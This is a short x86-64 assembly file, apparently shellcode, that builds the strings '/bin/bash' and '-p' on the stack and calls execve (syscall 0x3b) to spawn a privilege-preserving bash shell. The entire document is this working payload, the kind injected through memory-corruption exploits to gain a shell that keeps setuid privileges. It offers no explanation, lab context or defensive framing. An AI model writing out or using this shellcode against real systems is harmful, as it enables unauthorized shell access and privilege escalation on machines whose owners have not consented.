BITS 64

section .text
global _start

_start:
	xor rax, rax
	push rax
	push 0x702d
	mov rcx, rsp ; addr of "-p"
	mov rbx, 0x68
	push rbx
	mov rbx, 0x7361622f6e69622f
	push rbx
	mov rdi, rsp
	push rax
	push rcx
	push rdi
	mov rsi, rsp
	mov al, 0x3b
	xor rdx, rdx
	syscall
